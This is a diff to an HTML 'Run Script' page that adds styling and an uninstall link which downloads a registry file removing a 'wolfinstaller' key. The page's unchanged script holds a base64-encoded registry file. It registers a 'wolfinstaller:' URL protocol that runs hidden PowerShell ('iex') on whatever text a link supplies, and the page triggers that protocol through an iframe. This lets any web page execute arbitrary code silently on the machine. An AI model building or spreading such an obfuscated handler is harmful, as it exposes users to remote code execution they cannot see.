@@ -55,6 +55,21 @@
     button:hover {
       background-color: #0056b3;
     }
+        .small-text {
+      position: absolute;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 12px;
+      color: #666;
+    }
+    .small-text a {
+      color: #007BFF;
+      text-decoration: none;
+    }
+    .small-text a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -77,6 +92,10 @@
       <button id="run-script-btn">Run Script</button>
     </div>
   </div>
+
+   <div class="small-text">
+      <a href="#" id="download-uninstall-btn">Download Uninstall Script</a>
+    </div>
 
   <script>
     const regContentBase64 = "V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwCgpbSEtFWV9DTEFTU0VTX1JPT1Rcd29sZmluc3RhbGxlcl0KQD0iVVJMOldvbGYgSW5zdGFsbGVyIFByb3RvY29sIgoiVVJMIFByb3RvY29sIj0iIgoKW0hLRVlfQ0xBU1NFU19ST09UXHdvbGZpbnN0YWxsZXJcc2hlbGxdCgpbSEtFWV9DTEFTU0VTX1JPT1Rcd29sZmluc3RhbGxlclxzaGVsbFxvcGVuXQoKW0hLRVlfQ0xBU1NFU19ST09UXHdvbGZpbnN0YWxsZXJcc2hlbGxcb3Blblxjb21tYW5kXQpAPSJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIFwiaWV4IChbc3RyaW5nXShbU3lzdGVtLlVyaV06OlVuZXNjYXBlRGF0YVN0cmluZygnJTEnKSAtcmVwbGFjZSAnd29sZmluc3RhbGxlcjonKSlcIiI=";
@@ -103,6 +122,21 @@
       document.body.appendChild(iframe);
       iframe.src = protocolCommand;
     });
+
+    const uninstallRegContentBase64 = "V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwCgpbLUhLRVlfQ0xBU1NFU19ST09UXHdvbGZpbnN0YWxsZXJd"
+
+    // Function to download the decoded uninstall registry file
+    document.getElementById('download-uninstall-btn').addEventListener('click', function() {
+      const uninstallRegContent = atob(uninstallRegContentBase64.trim());
+      const blob = new Blob([uninstallRegContent], { type: 'application/octet-stream' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'uninstall_wolfinstaller.reg';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+    
   </script>
 </body>
 </html>
